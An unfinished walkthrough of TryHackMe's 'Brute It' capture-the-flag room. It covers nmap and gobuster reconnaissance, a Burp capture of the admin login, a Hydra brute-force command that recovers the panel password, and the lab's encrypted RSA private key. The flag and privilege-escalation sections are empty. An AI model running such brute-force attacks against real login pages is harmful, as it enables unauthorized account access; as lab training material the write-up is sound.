# Brute It

## Summary

[Brute It](https://tryhackme.com/room/bruteit "Brute It CTF on TryHackMe") is a begginer friendly CTF hosted by [TryHackMe](https://tryhackme.com/ "TryHackMe Official Website") and created by [ReddyyZ](https://tryhackme.com/p/ReddyyZ "ReddyyZ Profile On TryHackMe").

This CTF requires basic knowledge of:

* Port scanning with tools like ```nmap```.

* Directory/file scanning with tools like ```gobuster```.

* Examining ```HTML``` source code.

* Examining HTTP requests with tools like ```BurpSuite```.

* Bruteforcing login pages with tools like ```Hydra```.

* Getting the hash value of a private RSA key with tools like ```ssh2john```.

* Hash cracking with tools like ```JohnTheRipper```.

* Connecting to a remote server with ```SSH``` using a private key.

* Combining passwd and shadow files with tools like ```unshadow```.

---

## Contents

* [Reconnaissance](#recoinnaissance "Jump To Recoinnassance")

    * [How Many Ports Are Open?](#ports "Jump To Ports")

    * [What Version Of SSH Is Running?](#ssh-version "Jump To SSH Version")

    * [What Version Of Apache Is Running?](#apache-version "Jump To Apache Version")

    * [Which Linux Distribution Is Running?](#linux-distribution "Jump To Linnux Distribution")

    * [What Is The Hidden Directory?](#hidden-directory "Jump To Hidden Directory")

* [Getting A Shell](#getting-a-shell "Jump To Getting A Shell")

    * [What Is The User:Password Of The Admin Panel?](#credentials "Jump To Credentials")

    * [What Is John's RSA Private Key Passphrase?](#rsa-private-key "Jump To RSA Private Key")

    * [User.txt Flag](#usertxt "Jump To User.txt")

    * [Web Flag](#web-flag "Jump To Web Flag")

* [Privilege Escalation](#privilege-escalation "Jump To Privilege Escalation")

    * [What Is The Root's Password?](#roots-password "Jump To Root's Password")

    * [Root.txt Flag](#root-flag "Jump To Root Flag")

---

## Recoinnaissance

### Ports

As always, we start by turning on the target machine and using the ```ping``` command to make sure the machine is up and running.

```
$ ping <IP_Address>

PING <IP_Address> (<IP_Address>) 56(84) bytes of data.
64 bytes from <IP_Address>: icmp_seq=1 ttl=61 time=213 ms
64 bytes from <IP_Address>: icmp_seq=2 ttl=61 time=175 ms
64 bytes from <IP_Address>: icmp_seq=3 ttl=61 time=218 ms
64 bytes from <IP_Address>: icmp_seq=4 ttl=61 time=179 ms
^C
--- <IP_Address> ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3004ms
rtt min/avg/max/mdev = 175.097/195.956/217.527/19.226 ms
```

Once we've verified the machine is active we can move on to a port scan using ```nmap``` in aggressive mode (```-A```). This will return open ports, services, as well as other useful information.

```
$ nmap -A <IP_Address>

Nmap scan report for <IP_Address>
Host is up (0.24s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

After we run a port scan we'll see that we have 2 ports open.

* ```Port 22``` - SSH (Secure Shell)

* ```Port 80``` - HTTP (HyperText Transfer Protocol)

### SSH Version

We can also see, from the results of our port scan above, that the SSH version of the target IP is ```OpenSSH 7.6p1```.

```22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)```

### Apache Version

The port scan also showed us that the version of Apache that is running on the target IP is ```2.4.29```.

```80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))```

### Linux Distribution

We also saw the Linux Distribution on the target IP was ```Ubuntu```.

```|_http-title: Apache2 Ubuntu Default Page: It works```

### Hidden Directory

If we visit the website we found in the port scan we'll be greeted with the "Apache2 Ubuntu Default Page", and viewing the HTML source code reveals nothing of use. So our next step is to use ```GoBuster``` to find hidden directories.

```
$ gobuster -w /path/to/wordlist -u <IP_Address>

=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://<IP_Address>/
[+] Threads      : 10
[+] Wordlist     : /path/to/wordlist
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 10s
=====================================================
2023/01/18 10:29:23 Starting gobuster
=====================================================
/admin (Status: 301)
```

Almost immediately the scan returns a directory named ```/admin```.

[BACK TO TOP](#brute-it "Jump To Top")

---

## Getting A Shell

### Credentials

Now that we've found the admin login at ```http://<IP_Address>/admin``` we'll need a way to login. We can start by viewing the HTML source code for any hints, where we'll find an interesting comment from one of the developers addressed to "John" reminding him that his username is ```admin```.

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="styles.css">
    <title>Admin Login Page</title>
</head>
<body>
    <div class="main">
        <form action="" method="POST">
            <h1>LOGIN</h1>

            
            <label>USERNAME</label>
            <input type="text" name="user">

            <label>PASSWORD</label>
            <input type="password" name="pass">

            <button type="submit">LOGIN</button>
        </form>
    </div>

    <!-- Hey john, if you do not remember, the username is admin -->
</body>
</html>
```

Armed with this piece of information we can perform a dictionary attack against the login form. But first we'll need to know where and how the names and values get sent to the server, so we'll have to intercept the HTTP request for a failed login with ```BurpSuite```.

```http
POST /admin/ HTTP/1.1
Host: <IP_Address>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 31
Origin: http://<IP_Address>
Connection: close
Referer: http://<IP_Address>/admin/
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
DNT: 1

user=testname&pass=testpassword
```

After we've intercepted the request we'll see that if we try to login with the username ```testname``` and the password ```testpassword``` the server is sent the following...

```user=testname&pass=testpassword```

We'll have to use the ```user``` and ```pass``` names when we craft our Hydra command and replace the values with placeholders. One for admin and one for our wordlist (```user=^USER^&pass=^PASS^```).

Another thing we'll need is the text that appears on the form after a failed login, which in our case is ```Username or password invalid```. Hydra will identify all logins that trigger that line of text as incorrect.

Now that we have the login location, method (```POST```), form names, and incorrect text we can type out the command.

```hydra -l admin -P /path/to/wordlist <IP_Address> http-post-form "/admin/:user=^USER^&pass=^PASS^:F=Username or password invalid"```

After we execute the previous command we should see output similar to the following.

```
[80][http-post-form] host: <IP_Address>   login: admin   password: xavier
1 of 1 target successfully completed, 1 valid password found
```

Now we have the credentials to login, ```admin:xavier```.

### RSA Private Key

Once we login at ```http://<IP_Address>/admin``` we'll be redirected to ```http://<IP_Address>/admin/panel/``` where we'll see the following text...

> Hello john, finish the development of the site, here's your RSA private key.

We'll also see the flag needed for [Web Flag](#web-flag "Jump To Web Flag").

If we click the link we'll be taken to ```http://<IP_Address>/admin/panel/id_rsa``` where we can find John's private key.

```rsa
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,E32C44CDC29375458A02E94F94B280EA

JCPsentybdCSx8QMOcWKnIAsnIRETjZjz6ALJkX3nKSI4t40y8WfWfkBiDqvxLIm
UrFu3+/UCmXwceW6uJ7Z5CpqMFpUQN8oGUxcmOdPA88bpEBmUH/vD2K/Z+Kg0vY0
BvbTz3VEcpXJygto9WRg3M9XSVsmsxpaAEl4XBN8EmlKAkR+FLj21qbzPzN8Y7bK
HYQ0L43jIulNKOEq9jbI8O1c5YUwowtVlPBNSlzRMuEhceJ1bYDWyUQk3zpVLaXy
+Z3mZtMq5NkAjidlol1ZtwMxvwDy478DjxNQZ7eR/coQmq2jj3tBeKH9AXOZlDQw
UHfmEmBwXHNK82Tp/2eW/Sk8psLngEsvAVPLexeS5QArs+wGPZp1cpV1iSc3AnVB
VOxaB4uzzTXUjP2H8Z68a34B8tMdej0MLHC1KUcWqgyi/Mdq6l8HeolBMUbcFzqA
vbVm8+6DhZPvc4F00bzlDvW23b2pI4RraI8fnEXHty6rfkJuHNVR+N8ZdaYZBODd
/n0a0fTQ1N361KFGr5EF7LX4qKJz2cP2m7qxSPmtZAgzGavUR1JDvCXzyjbPecWR
y0cuCmp8BC+Pd4s3y3b6tqNuharJfZSZ6B0eN99926J5ne7G1BmyPvPj7wb5KuW1
yKGn32DL/Bn+a4oReWngHMLDo/4xmxeJrpmtovwmJOXo5o+UeEU3ywr+sUBJc3W8
oUOXNfQwjdNXMkgVspf8w7bGecucFdmI0sDiYGNk5uvmwUjukfVLT9JPMN8hOns7
onw+9H+FYFUbEeWOu7QpqGRTZYoKJrXSrzII3YFmxE9u3UHLOqqDUIsHjHccmnqx
zRDSfkBkA6ItIqx55+cE0f0sdofXtvzvCRWBa5GFaBtNJhF940Lx9xfbdwOEZzBD
wYZvFv3c1VePTT0wvWybvo0qJTfauB1yRGM1l7ocB2wiHgZBTxPVDjb4qfVT8FNP
f17Dz/BjRDUIKoMu7gTifpnB+iw449cW2y538U+OmOqJE5myq+U0IkY9yydgDB6u
uGrfkAYp6NDvPF71PgiAhcrzggGuDq2jizoeH1Oq9yvt4pn3Q8d8EvuCs32464l5
O+2w+T2AeiPl74+xzkhGa1EcPJavpjogio0E5VAEavh6Yea/riHOHeMiQdQlM+tN
C6YOrVDEUicDGZGVoRROZ2gDbjh6xEZexqKc9Dmt9JbJfYobBG702VC7EpxiHGeJ
mJZ/cDXFDhJ1lBnkF8qhmTQtziEoEyB3D8yiUvW8xRaZGlOQnZWikyKGtJRIrGZv
OcD6BKQSzYoo36vNPK4U7QAVLRyNDHyeYTo8LzNsx0aDbu1rUC+83DyJwUIxOCmd
6WPCj80p/mnnjcF42wwgOVtXduekQBXZ5KpwvmXjb+yoyPCgJbiVwwUtmgZcUN8B
zQ8oFwPXTszUYgNjg5RFgj/MBYTraL6VYDAepn4YowdaAlv3M8ICRKQ3GbQEV6ZC
miDKAMx3K3VJpsY4aV52au5x43do6e3xyTSR7E2bfsUblzj2b+mZXrmxst+XDU6u
x1a9TrlunTcJJZJWKrMTEL4LRWPwR0tsb25tOuUr6DP/Hr52MLaLg1yIGR81cR+W
-----END RSA PRIVATE KEY-----
```

### user.txt

### Web Flag

[BACK TO TOP](#brute-it "Jump To Top")

---

## Privilege Escalation

### Root's Password

### Root Flag

---

[BACK TO TOP](#brute-it "Jump To Top")
